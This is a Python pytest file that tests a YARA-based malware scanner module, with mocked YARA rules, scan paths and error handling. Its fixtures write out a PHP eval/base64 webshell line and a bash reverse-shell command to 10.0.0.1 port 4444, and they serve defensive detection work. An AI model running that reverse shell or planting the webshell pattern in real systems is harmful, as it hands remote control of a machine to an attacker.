import sys
import types
import tempfile
import os
import pytest
from unittest.mock import MagicMock, patch


def test_returns_empty_list_when_yara_not_installed():
    """If yara-python is not installed, run() returns [] without raising."""
    with patch.dict(sys.modules, {"yara": None}):
        # Force re-import with yara absent
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        result = yara_scanner.run()
    assert result == []


def test_returns_empty_list_when_no_matches(tmp_path):
    """Files that don't match any rule produce no findings."""
    clean_file = tmp_path / "clean.txt"
    clean_file.write_text("hello world")

    mock_yara = MagicMock()
    mock_rules = MagicMock()
    mock_rules.match.return_value = []
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        # Override FIXED_PATHS so it only scans tmp_path
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = [str(tmp_path)]
        result = yara_scanner.run()
        yara_scanner.FIXED_PATHS = orig

    assert result == []


def test_returns_finding_on_yara_match(tmp_path):
    """A YARA match on a file produces one finding dict."""
    infected_file = tmp_path / "shell.php"
    infected_file.write_text("<?php eval(base64_decode('xxx')); ?>")

    mock_match = MagicMock()
    mock_match.rule = "Webshell_PHP_Eval"
    mock_match.namespace = "default"

    mock_rules = MagicMock()
    mock_rules.match.return_value = [mock_match]

    mock_yara = MagicMock()
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = [str(tmp_path)]
        result = yara_scanner.run()
        yara_scanner.FIXED_PATHS = orig

    assert len(result) == 1
    assert result[0]["rule"] == "Webshell_PHP_Eval"
    assert result[0]["severity"] == "high"
    assert str(infected_file) == result[0]["file"]


def test_extra_path_is_scanned(tmp_path):
    """extra_path files are included in the scan."""
    extra_dir = tmp_path / "extra"
    extra_dir.mkdir()
    target = extra_dir / "suspicious.sh"
    target.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

    mock_match = MagicMock()
    mock_match.rule = "Reverse_Shell_Bash"
    mock_rules = MagicMock()
    # Only match in the extra path
    def _match(filepath):
        if str(extra_dir) in filepath:
            return [mock_match]
        return []
    mock_rules.match.side_effect = _match
    mock_yara = MagicMock()
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = []  # no fixed paths
        result = yara_scanner.run(extra_path=str(extra_dir))
        yara_scanner.FIXED_PATHS = orig

    assert len(result) == 1
    assert result[0]["rule"] == "Reverse_Shell_Bash"


def test_compile_error_returns_empty_list():
    """YARA compile error → [] with no exception raised."""
    mock_yara = MagicMock()
    mock_yara.compile.side_effect = Exception("SyntaxError in rules")
    mock_yara.SyntaxError = Exception

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        result = yara_scanner.run()

    assert result == []
